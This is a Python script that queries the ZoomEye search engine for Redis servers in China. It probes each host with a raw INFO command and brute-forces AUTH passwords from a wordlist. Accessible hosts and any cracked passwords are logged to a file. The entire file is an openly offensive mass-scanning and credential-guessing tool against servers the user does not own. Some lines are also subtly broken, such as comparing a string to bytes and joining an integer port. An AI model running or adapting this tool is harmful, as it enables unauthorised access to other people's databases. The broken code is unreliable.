# -*- coding: utf-8 -*-
import socket
import requests
import json


def login():
    data = {"username": 'username', "password": 'password'}
    r = requests.post('https://api.zoomeye.org/user/login', json=data)
    return json.loads(r.text)


def verify(port, ip_addr, passwdlist):
    s = socket.socket()
    s.settimeout(5)
    try:
        s.connect((ip_addr, port))
        payload = '\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a'
        s.send(payload.encode('utf-8'))
        recv_data = s.recv(512)
        if recv_data:
            if b'version' in recv_data:
                return True, ''
            elif b'NOAUTH' in recv_data:
                if passwdlist != '':
                    with open(passwdlist, 'rb') as f:
                        print('try to find the passwd for ' + ip_addr)
                        passwds = f.readlines()
                        for passwd in passwds:
                            p = passwd.decode('utf-8').strip()
                            passwd_payload = '*2\r\n$4\r\nauth\r\n$' + str(len(p)) + '\r\n' + p + '\r\n'
                            s.send(passwd_payload.encode('utf-8'))
                            pass_recv = s.recv(128)
                            if pass_recv and 'OK' in pass_recv:
                                s.send(payload.encode('utf-8'))
                                retry_info_recv = s.recv(512)
                                if b'version' in retry_info_recv:
                                    return True, passwd
                return False, ''
        else:
            return False, ''
    except Exception as e:
        print(e)


def main():
    token = login()
    headers = {'Authorization': 'JWT ' + token['access_token']}
    base_url = 'https://api.zoomeye.org/host/search?query=app:redis%20%2Bcountry:"CN"&page='
    passwdlist = '/path/to/wordlist'

    for i in range(1, 100):
        r = requests.get(url=base_url + str(i), headers=headers)
        res = json.loads(r.text)
        try:
            for x in res['matches']:
                ip_addr = x['ip'].strip()
                port = x['portinfo']['port']
                print('-------\n' + ip_addr + '  ' + str(port))
                flag, passwd = verify(port, ip_addr, passwdlist)
                if flag:
                    with open('redis-res.txt', 'a+') as fw:
                        fw.write(' '.join([ip_addr, port, passwd]) + '\n')

        except Exception as e:
            print(e)


if __name__ == '__main__':
    main()
